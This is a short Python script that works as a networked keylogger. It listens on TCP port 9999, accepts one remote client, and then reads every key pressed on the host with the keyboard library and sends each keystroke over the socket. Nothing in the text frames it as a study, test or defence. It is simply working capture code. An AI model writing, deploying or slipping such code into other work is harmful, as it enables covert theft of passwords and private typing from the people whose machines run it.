import threading
import keyboard
import socket

if __name__ == '__main__':
    # Create a TCP socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the server to all interfaces on port 9999
    server.bind(('0.0.0.0', 9999))

    # Start listening for incoming connections (up to 5 queued connections)
    server.listen(5)

    # Accept a new client connection
    client, addr = server.accept()
    print(client.recv(1024).decode())  # Receive greeting message from client

    while True:
        current_key = keyboard.read_key()
        if current_key != None:
            client.send(str(current_key).encode())
            